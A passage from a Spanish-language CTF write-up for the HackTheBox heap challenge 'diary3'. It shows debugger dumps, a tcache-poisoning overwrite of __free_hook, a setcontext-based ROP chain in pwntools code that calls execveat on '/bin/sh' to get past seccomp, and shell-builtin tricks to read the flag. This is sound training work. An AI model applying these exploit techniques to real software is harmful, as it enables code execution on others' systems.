<span class="code-dark-yellow">all</span>: <span class="code-dark-blue">0x563b8f3eab90</span> —▸ <span class="code-dark-magenta">0x7fa22c2e6ca0</span> ◂— 0x563b8f3eab90
<span class="code-dark-blue">smallbins</span>
<span class="code-dark-yellow">empty</span>
<span class="code-dark-blue">largebins</span>
<span class="code-dark-yellow">empty
<span class="code-red">pwndbg&gt; </span>continue
Continuing.
</code></pre></div><p>Como se puede ver, tenemos un <em>chunk</em> del <em>Unsorted Bin</em> dentro de otro <em>chunk</em> (<em>chunks</em> solapados). Si asignamos un <em>chunk</em> de tamaño <code>0x20</code> (por ejemplo), se colocará ahí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101  
<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x0000000000000021
<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x00007f0a66647361      0x00007fa22c2e6e80
<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x00000000000001d1
<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x00007fa22c2e6ca0      0x00007fa22c2e6ca0
<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
</code></pre></div><p>Entonces, la idea aquí es realizar un ataque de Tcache <em>poisoning</em>, ya que ahora podemos liberar este <em>chunk</em> de tamaño <code>0x20</code> y editar la parte de datos del <em>chunk</em> &ldquo;contenedor&rdquo; para modificar el puntero <code>fd</code>. Pondremos la dirección de <code>__free_hook</code> para asignar un <em>chunk</em> allí y secuestrar la ejecución de <code>free</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__free_hook)[:</span><span class="mtk6">7</span><span class="mtk1">])</span>  
</code></pre></div><p>Obsérvese que no podemos ingresar al completo la dirección de <code>__free_hook</code> porque <code>edit_dream</code> no permite bytes nulos.</p><p>Entonces hemos puesto <code>__free_hook</code> en la lista del Tcache:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>tcachebins
<span class="code-dark-yellow">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span>
<span class="code-dark-yellow">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span>

<span class="code-dark-blue">tcachebins</span>
<span class="code-dark-yellow">0x20 [  1]</span>: <span class="code-dark-blue">0x5583b0dbeba0</span> —▸ <span class="code-dark-magenta">0x7f63a66205a8 (__free_hook)</span> ◂— ...
<span class="code-dark-yellow">0x100 [  7]</span>: <span class="code-dark-blue">0x5583b0dbed90</span> —▸ <span class="code-dark-blue">0x5583b0dbee90</span> —▸ <span class="code-dark-blue">0x5583b0dbef90</span> —▸ <span class="code-dark-blue">0x5583b0dbf090</span> —▸ <span class="code-dark-blue">0x5583b0dbf190</span> —▸ <span class="code-dark-blue">0x5583b0dbf290</span> —▸ <span class="code-dark-blue">0x5583b0dbf390</span> ◂— 0x0  
<span class="code-dark-yellow">0x410 [  1]</span>: <span class="code-dark-blue">0x5583b0dbd260</span> ◂— 0x0
<span class="code-red">pwndbg&gt; </span>continue
Continuing.
</code></pre></div><p>Ahora podemos asignar dos <em>chunks</em> de tamaño <code>0x20</code> y escribir en <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './diary3'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./'</span>
[<span class="code-green">+</span>] Starting local process './diary3': pid 3631968
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3631968', '-x', '/tmp/pwn7rw3qc5_.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Heap base address: 0x5583b0dbd000
[<span class="code-green">+</span>] Glibc base address: 0x7f63a6439000
[<span class="code-blue">*</span>] Switching to interactive mode
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; <span class="code-red">$</span> 1
size: <span class="code-red">$</span> 24
data: <span class="code-red">$</span> asdf
done
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; <span class="code-red">$</span> 1
size: <span class="code-red">$</span> 24
data: <span class="code-red">$</span> ABCDEFG
done
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; <span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/gx &__free_hook
<span class="code-dark-blue">0x7f63a66205a8</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;:   0x0a47464544434241  
</code></pre></div><p>Perfecto, ahora es momento de obtener ejecución de comandos.</p><h3 id="rop-_chain_">ROP <em>chain</em></h3><p>Recordemos que había reglas <code>secomp</code> activas (en verdad, instrucciones <code>syscall</code> no permitidas) y que Glibc no contiene la cadena <code>"/bin/sh"</code>, por lo que <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> no funciona aquí. Además, no podemos usar <code>system</code> porque emplea <code>sys_fork</code> y <code>sys_execve</code> por detrás, y no están permitidss.</p><p>Además, recordemos que tenemos <code>sys_execveat</code> y <code>sys_openat</code>. Este último podría haber funcionado si supiéramos el nombre de archivo para leer la <em>flag</em>, pero el autor del reto dijo que no se podía adivinar, por lo que nos vemos obligados a obtener una <em>shell</em> con <code>sys_execveat</code>.</p><p>Para llamar a <code>sys_execveat</code>, necesitamos elaborar una cadena de ROP para establecer los registros necesarios (más información en <a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man7.org</a>):</p><ul><li><code>$rax = 322</code></li><li><code>$rdi</code> contiene un descriptor de archivo de directorio (que no se usa si el archivo para ejecutar tiene una ruta absoluta)</li><li><code>$rsi</code> tiene un puntero al nombre de archivo (preferiblemente una ruta absoluto)</li><li><code>$rdx</code> configurado a <code>NULL</code> (puntero <code>argv</code>)</li><li><code>$r10</code> configurado a <code>NULL</code> (puntero <code>envp</code>)</li><li><code>$r9 = 0</code> (<code>flags</code>)</li></ul><p>El problema aquí es que no tenemos acceso a la pila, por lo que es difícil obtener el control del puntero de instrucción para ejecutar la cadena ROP. Buscando formas posibles de ejecutar una cadena ROP en el <em>heap</em>, encontré <a href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/">este <em>write-up</em></a>. Afortunadamente, el <em>write-up</em> es muy similar a este reto: necesitan usar una cadena ROP de tipo <em>open-read-write</em> en el <em>heap</em> para saltarse las reglas <code>seccomp</code>.</p><p>La clave es una función llamada <code>setcontext</code> de Glibc que contiene un <em>gadget</em> muy útil para configurar muchos registros:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=setcontext <span class="mtku">libc.so.6</span>

libc.so.6:     file format elf64-x86-64


Disassembly of section .plt:

Disassembly of section .plt.got:

Disassembly of section .text:

0000000000055e00 &lt;setcontext@@GLIBC_2.2.5&gt;:
   55e00:       57                      push   rdi
   55e01:       48 8d b7 28 01 00 00    lea    rsi,[rdi+0x128]
   55e08:       31 d2                   xor    edx,edx
   55e0a:       bf 02 00 00 00          mov    edi,0x2
   55e0f:       41 ba 08 00 00 00       mov    r10d,0x8
   55e15:       b8 0e 00 00 00          mov    eax,0xe
   55e1a:       0f 05                   syscall
   55e1c:       5a                      pop    rdx
   55e1d:       48 3d 01 f0 ff ff       cmp    rax,0xfffffffffffff001
   55e23:       73 5b                   jae    55e80 &lt;setcontext@@GLIBC_2.2.5+0x80&gt;
   55e25:       48 8b 8a e0 00 00 00    mov    rcx,QWORD PTR [rdx+0xe0]
   55e2c:       d9 21                   fldenv [rcx]
   55e2e:       0f ae 92 c0 01 00 00    ldmxcsr DWORD PTR [rdx+0x1c0]
   55e35:       48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]
   55e3c:       48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]
   55e43:       48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]
   55e47:       4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]
   55e4b:       4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]
   55e4f:       4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]
   55e53:       4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]
   55e57:       48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]
   55e5e:       51                      push   rcx
   55e5f:       48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]
   55e63:       48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]
   55e67:       48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]
   55e6e:       4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]
   55e72:       4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]
   55e76:       48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]
   55e7d:       31 c0                   xor    eax,eax
   55e7f:       c3                      ret
   55e80:       48 8b 0d e9 df 18 00    mov    rcx,QWORD PTR [rip+0x18dfe9]        # 1e3e70 &lt;h_errlist@@GLIBC_2.2.5+0xdd0&gt;  
   55e87:       f7 d8                   neg    eax
   55e89:       64 89 01                mov    DWORD PTR fs:[rcx],eax
   55e8c:       48 83 c8 ff             or     rax,0xffffffffffffffff
   55e90:       c3                      ret

Disassembly of section __libc_freeres_fn:
</code></pre></div><p>Este <em>gadget</em> (<code>setcontext + 0x35</code>) es útil siempre que tengamos control sobre <code>$rdx</code>.</p><p>Al usar <code>__free_hook</code> tenemos control sobre <code>$rdi</code> porque es donde va el primer argumento de <code>free</code>. Hay otro <em>gadget</em> para controlar <code>$rdx</code> si controlamos <code>$rdi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': mov rdx, qword ptr \[rdi'</span>
0x0000000000093806 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 0x28] ; mov qword ptr [rdx + 0x20], rax ; jmp 0x937d6
0x0000000000150550 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]  
0x0000000000136125 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 8] ; mov rcx, qword ptr [rdi + 0x10] ; jmp 0x135f23
0x0000000000107e68 <span class="code-red">: mov rdx, qword ptr [rdi</span>] ; jmp 0x107d3f
</code></pre></div><p>Estamos interesados ​​en:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">0x0000000000150550 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]  
</code></pre></div><p>Con este, podemos configurar <code>$rdx</code> al valor en <code>$rdi + 8</code> y luego llamar a la dirección en <code>$rdx + 0x20</code> (esto es, <code>$rdi + 0x28</code>).</p><p>Entonces, intentaremos llamar al <em>gadget</em> de <code>setcontext</code> usando el <em>gadget</em> anterior para configurar un montón de registros a partir de <code>$rdx</code>. Sin embargo, hay algunos registros que no aparecen en el <em>gadget</em>, por lo que tenemos que configurar <code>$rsp</code> de forma apropiada para regresar a una segunda cadena ROP que se colocará en el <em>heap</em> y así configurar <code>$rax</code>, <code>$r10</code> y ejecutar <code>syscall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop r.. ; ret$'</span>  
0x000000000012bda5 <span class="code-red">: pop r10 ; ret</span>
0x0000000000030e4d <span class="code-red">: pop r12 ; ret</span>
0x0000000000026a25 <span class="code-red">: pop r13 ; ret</span>
0x0000000000026f9d <span class="code-red">: pop r14 ; ret</span>
0x0000000000026541 <span class="code-red">: pop r15 ; ret</span>
0x0000000000047cf8 <span class="code-red">: pop rax ; ret</span>
0x00000000000253a6 <span class="code-red">: pop rbp ; ret</span>
0x00000000000314f9 <span class="code-red">: pop rbx ; ret</span>
0x000000000010b31e <span class="code-red">: pop rcx ; ret</span>
0x0000000000026542 <span class="code-red">: pop rdi ; ret</span>
0x000000000012bda6 <span class="code-red">: pop rdx ; ret</span>
0x0000000000026f9e <span class="code-red">: pop rsi ; ret</span>
0x0000000000030e4e <span class="code-red">: pop rsp ; ret</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': syscall'</span>
0x0000000000026bd4 <span class="code-red">: syscall
</code></pre></div><p>Entonces este es el código para las cadenas ROP:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">pop_rax_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">047cf8</span>
<span class="mtk1">    </span><span class="mtk1">pop_r10_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">12bda5</span>
<span class="mtk1">    </span><span class="mtk1">syscall_addr</span><span class="mtk1">     </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">26bd4</span>

<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_r10_ret_addr</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)    </span><span class="mtk3"># envp</span>
<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rax_ret_addr</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">322</span><span class="mtk1">)  </span><span class="mtk3"># sys_execveat</span>
<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">syscall_addr</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1bc0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.setcontext </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">35</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x28] = r8</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x30] = r9</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">                       </span><span class="mtk3"># padding</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x48] = r12</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x50] = r13</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x58] = r14</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x60] = r15</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x68] = rdi (dir_fd)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ba0</span><span class="mtk1">)    </span><span class="mtk3"># &lt;-- [rdx + 0x70] = rsi (pointer to "/bin/sh")</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x78] = rbp</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x80] = rbx</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x88] = rdx (argv)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">                        </span><span class="mtk3"># padding</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x98] = rcx</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1bc8</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk3"># &lt;-- [rdx + 0xa0] = rsp, pointing to ROP chain</span>  
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">rop_chain</span><span class="mtk1">                       </span><span class="mtk3"># &lt;-- [rdx + 0xa8] = rcx, will be pushed</span>
</code></pre></div><p>Algunos <em>offsets</em> deben tomarse de GDB. Para iniciar la cadena ROP, debemos ingresar al primer <em>gadget</em> en <code>__free_hook</code> y llamar a <code>free</code> sobre un <em>chunk</em> que contenga valores en los <em>offsets</em> <code>8</code> y <code>28</code> para al <em>gadget</em> de <code>setcontext</code> y finalmente terminar la cadena ROP para llamar <code>sys_execveat</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">150550</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">158</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">13</span><span class="mtk1">)</span>
</code></pre></div><p>Después de mucho trabajo, obtenemos con éxito una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './diary3'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./'</span>
[<span class="code-green">+</span>] Starting local process './diary3': pid 3649245  
[<span class="code-blue">*</span>] Heap base address: 0x562b6634f000
[<span class="code-green">+</span>] Glibc base address: 0x7f4a1d167000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
Bad system call (core dumped)
<span class="code-red">$</span> whoami
Bad system call (core dumped)
<span class="code-red">$</span> id
Bad system call (core dumped)
<span class="code-red">$</span> cat flag.txt
Bad system call (core dumped)
</code></pre></div><p>Pero&mldr; no podemos ejecutar comandos porque las reglas de <code>seccomp</code> aún bloquean <code>sys_execve</code> y <code>sys_fork</code>. Sin embargo, podemos usar comandos propios de <em>shell</em> como <code>echo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> echo asdf
asdf
<span class="code-red">$</span> echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
</code></pre></div><p>Además, podemos listar archivos con <code>echo *</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> echo *
diary3 flag.txt ld-2.29.so libc.so.6 note.txt solve.py  
</code></pre></div><p>Y finalmente, podemos usar <code>read</code> dentro de un bucle <code>while</code> para leer un archivo mediante con un redirector:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> while read line; do echo $line; done &lt; flag.txt  
HTB{f4k3_fl4g_f0r_t35t1ng}
